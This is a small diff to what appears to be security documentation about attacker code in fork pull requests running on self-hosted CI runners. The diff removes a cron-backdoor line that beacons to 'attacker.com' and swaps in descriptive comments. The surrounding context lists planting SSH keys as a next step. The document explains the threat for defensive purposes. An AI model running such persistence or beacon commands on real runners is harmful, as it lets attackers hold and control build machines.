@@ -30,8 +30,9 @@ jobs:
 ```bash
 # Attacker's code in a fork PR running on self-hosted runner:
 
-# 1. Install a persistent backdoor
-echo '* * * * * curl https://attacker.com/beacon' >> /var/spool/cron/crontabs/runner
+# 1. Install a persistent backdoor (e.g., via crontab or systemd timer)
+# Example: crontab -e to add scheduled tasks
+# DANGEROUS: Writing to system cron directories like /var/spool/cron/* or /etc/cron*
 
 # 2. Drop SSH keys
 mkdir -p ~/.ssh
